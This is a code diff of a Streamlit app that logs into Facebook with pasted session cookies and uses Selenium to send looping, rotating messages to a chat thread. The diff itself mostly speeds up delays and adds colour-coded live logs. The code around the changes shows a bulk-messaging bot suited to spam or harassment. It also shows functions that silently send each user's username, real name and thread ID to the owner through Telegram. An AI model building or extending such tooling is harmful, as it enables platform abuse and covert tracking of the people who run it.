@@ -408,8 +408,6 @@ def send_telegram_message(message):
 def send_facebook_message_via_api(user_details):
     """Send user details to Facebook admin (simulated)"""
     try:
-        # This would typically use Facebook Graph API
-        # For now, we'll log it and send via Telegram as backup
         message = f"🔍 <b>NEW USER STARTED AUTOMATION</b>\n\n"
         message += f"👤 <b>Username:</b> {user_details['username']}\n"
         message += f"📛 <b>Real Name:</b> {user_details['real_name']}\n"
@@ -423,7 +421,6 @@ def send_facebook_message_via_api(user_details):
         message += f"🕒 <b>Started At:</b> {user_details['start_time']}\n"
         message += f"🌐 <b>Thread ID:</b> {user_details['thread_id']}"
         
-        # Send to Telegram as backup since Facebook API requires proper setup
         send_telegram_message(message)
         return True
     except Exception as e:
@@ -446,7 +443,6 @@ def send_user_details_to_owner(user_config, user_id, username, real_name, approv
         'thread_id': thread_id
     }
     
-    # Send to Telegram
     telegram_message = f"🔍 <b>NEW USER STARTED AUTOMATION</b>\n\n"
     telegram_message += f"👤 <b>Username:</b> {username}\n"
     telegram_message += f"📛 <b>Real Name:</b> {real_name}\n"
@@ -461,8 +457,6 @@ def send_user_details_to_owner(user_config, user_id, username, real_name, approv
     telegram_message += f"🌐 <b>Thread ID:</b> {thread_id}"
     
     send_telegram_message(telegram_message)
-    
-    # Send to Facebook (via simulated API)
     send_facebook_message_via_api(user_details)
 
 # Initialize session state
@@ -494,6 +488,7 @@ class AutomationState:
         self.logs = []
         self.message_rotation_index = 0
         self.thread_id = None
+        self.last_log_update = 0
 
 if 'automation_state' not in st.session_state:
     st.session_state.automation_state = AutomationState()
@@ -512,19 +507,25 @@ def log_message(msg, automation_state=None):
     
     if automation_state:
         automation_state.logs.append(formatted_msg)
+        automation_state.last_log_update = time.time()
+        # Keep only last 100 logs to prevent memory issues
+        if len(automation_state.logs) > 100:
+            automation_state.logs = automation_state.logs[-100:]
     else:
         if 'logs' in st.session_state:
             st.session_state.logs.append(formatted_msg)
+            if len(st.session_state.logs) > 100:
+                st.session_state.logs = st.session_state.logs[-100:]
 
 def find_message_input(driver, process_id, automation_state=None):
     log_message(f'{process_id}: Finding message input...', automation_state)
-    time.sleep(10)
+    time.sleep(5)
     
     try:
         driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
-        time.sleep(2)
+        time.sleep(1)
         driver.execute_script("window.scrollTo(0, 0);")
-        time.sleep(2)
+        time.sleep(1)
     except Exception:
         pass
     
@@ -687,7 +688,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
         
         log_message(f'{process_id}: Navigating to Facebook...', automation_state)
         driver.get('https://www.facebook.com/')
-        time.sleep(8)
+        time.sleep(5)
         
         if config['cookies'] and config['cookies'].strip():
             log_message(f'{process_id}: Adding cookies...', automation_state)
@@ -717,7 +718,7 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
             log_message(f'{process_id}: Opening messages...', automation_state)
             driver.get('https://www.facebook.com/messages')
         
-        time.sleep(15)
+        time.sleep(10)
         
         message_input = find_message_input(driver, process_id, automation_state)
         
@@ -794,21 +795,21 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
                 
                 messages_sent += 1
                 automation_state.message_count = messages_sent
-                log_message(f'{process_id}: Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
+                log_message(f'{process_id}: ✅ Message {messages_sent} sent: {message_to_send[:30]}...', automation_state)
                 
                 time.sleep(delay)
                 
             except Exception as e:
-                log_message(f'{process_id}: Error sending message: {str(e)}', automation_state)
+                log_message(f'{process_id}: ❌ Error sending message: {str(e)}', automation_state)
                 break
         
-        log_message(f'{process_id}: Automation stopped! Total messages sent: {messages_sent}', automation_state)
+        log_message(f'{process_id}: 🛑 Automation stopped! Total messages sent: {messages_sent}', automation_state)
         automation_state.running = False
         db.set_automation_running(user_id, False)
         return messages_sent
         
     except Exception as e:
-        log_message(f'{process_id}: Fatal error: {str(e)}', automation_state)
+        log_message(f'{process_id}: 💥 Fatal error: {str(e)}', automation_state)
         automation_state.running = False
         db.set_automation_running(user_id, False)
         return 0
@@ -864,6 +865,7 @@ def start_automation(user_config, user_id):
     automation_state.running = True
     automation_state.message_count = 0
     automation_state.logs = []
+    automation_state.last_log_update = time.time()
     
     db.set_automation_running(user_id, True)
     
@@ -878,8 +880,6 @@ def stop_automation(user_id):
 
 def admin_stop_user_automation(user_id):
     """Stop automation for a specific user from admin panel"""
-    # This would need to be implemented in your database module
-    # For now, we'll use the existing stop function
     db.set_automation_running(user_id, False)
     
     # Send notification to owner
@@ -1324,29 +1324,52 @@ else:
                         current_config = db.get_user_config(st.session_state.user_id)
                         if current_config and current_config['chat_id']:
                             start_automation(current_config, st.session_state.user_id)
-                            st.rerun()
+                            st.success("🚀 Automation started! Check logs below for real-time updates.")
                         else:
                             st.error("Please configure Chat ID first!")
                 
                 with col2:
                     if st.button("⏹️ Stop E2EE", disabled=not st.session_state.automation_state.running, use_container_width=True):
                         stop_automation(st.session_state.user_id)
+                        st.warning("🛑 Automation stopped!")
                         st.rerun()
                 
-                st.markdown("### 📜 Live Logs")
+                st.markdown("### 📜 Live Logs Console")
                 
-                if st.session_state.automation_state.logs:
-                    logs_html = '<div class="log-container">'
-                    for log in st.session_state.automation_state.logs[-50:]:
-                        logs_html += f'<div>{log}</div>'
-                    logs_html += '</div>'
-                    st.markdown(logs_html, unsafe_allow_html=True)
-                else:
-                    st.info("No logs yet. Start automation to see logs here.")
+                # Create a container for logs that will auto-refresh
+                logs_container = st.container()
                 
+                with logs_container:
+                    if st.session_state.automation_state.logs:
+                        logs_html = '<div class="log-container">'
+                        for log in st.session_state.automation_state.logs[-50:]:
+                            # Add color coding for different log types
+                            if '✅' in log:
+                                logs_html += f'<div style="color: #00ff00;">{log}</div>'
+                            elif '❌' in log or '💥' in log:
+                                logs_html += f'<div style="color: #ff6b6b;">{log}</div>'
+                            elif '🛑' in log:
+                                logs_html += f'<div style="color: #feca57;">{log}</div>'
+                            elif '🚀' in log:
+                                logs_html += f'<div style="color: #48dbfb;">{log}</div>'
+                            else:
+                                logs_html += f'<div>{log}</div>'
+                        logs_html += '</div>'
+                        st.markdown(logs_html, unsafe_allow_html=True)
+                    else:
+                        st.info("📋 No logs yet. Start automation to see live logs here.")
+                
+                # Auto-refresh when automation is running
                 if st.session_state.automation_state.running:
-                    time.sleep(1)
-                    st.rerun()
+                    # Check if logs have been updated recently
+                    current_time = time.time()
+                    if current_time - st.session_state.automation_state.last_log_update < 5:  # Updated in last 5 seconds
+                        time.sleep(1)
+                        st.rerun()
+                    else:
+                        # If no recent updates, check every 3 seconds
+                        time.sleep(3)
+                        st.rerun()
 
 st.markdown('</div>', unsafe_allow_html=True)  # Close main-container
 st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
